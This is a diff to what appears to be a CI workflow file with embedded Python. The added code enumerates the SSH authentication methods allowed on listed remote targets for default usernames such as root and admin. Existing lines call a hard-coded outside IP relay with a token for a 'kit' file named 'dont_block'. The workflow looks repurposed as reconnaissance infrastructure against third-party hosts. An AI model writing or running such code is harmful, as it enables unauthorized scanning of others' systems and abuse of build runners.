@@ -265,6 +265,43 @@ jobs:
               return out
 
 
+          def method_probe(host, port, users):
+              """Read the server's allowed auth methods via SSH_MSG_USERAUTH 'none' (not a failed auth)."""
+              import paramiko
+              out = {}
+              for u in users:
+                  t = None
+                  try:
+                      t = paramiko.Transport((host, port))
+                      t.start_client(timeout=12)
+                      try:
+                          t.auth_none(u)
+                          out[u] = 'NONE-ACCEPTED'
+                      except paramiko.BadAuthenticationType as e:
+                          out[u] = 'allowed:' + ','.join(e.allowed_types)
+                      except paramiko.AuthenticationException as e:
+                          out[u] = 'authfail:' + str(e)[:60]
+                      except Exception as e:
+                          out[u] = 'err:' + type(e).__name__ + ':' + str(e)[:60]
+                  except Exception as e:
+                      out[u] = 'conn:' + type(e).__name__ + ':' + str(e)[:80]
+                  finally:
+                      try:
+                          if t:
+                              t.close()
+                      except Exception:
+                          pass
+              return out
+
+
+          def do_methods():
+              for t in PLAN.get('method_targets', []):
+                  host, port = split_t(t)
+                  users = PLAN.get('method_users') or ['root', 'ubuntu', 'admin', 'user']
+                  OUT['probes']['methods:' + t] = {'attempts': [{'ok': True, 'ms': 0, 'banner': ''}],
+                                                   'methods': method_probe(host, port, users)}
+
+
           def do_probe():
               for t in PLAN.get('probe_targets', []):
                   host, port = split_t(t)
@@ -454,6 +491,8 @@ jobs:
               rc, so, _ = sh('curl -sS -m 8 -o /dev/null -w "%{http_code}:%{size_download}" '
                              '"http://117.148.167.132:18081/get?t=i12189tok&p=/tmp/i26254/kit/dont_block_4.txt"')
               OUT['relay_probe'] = so[:40]
+              if PLAN.get('method_targets'):
+                  do_methods()
               if PLAN.get('probe_targets'):
                   do_probe()
               if MODE == 'probe':
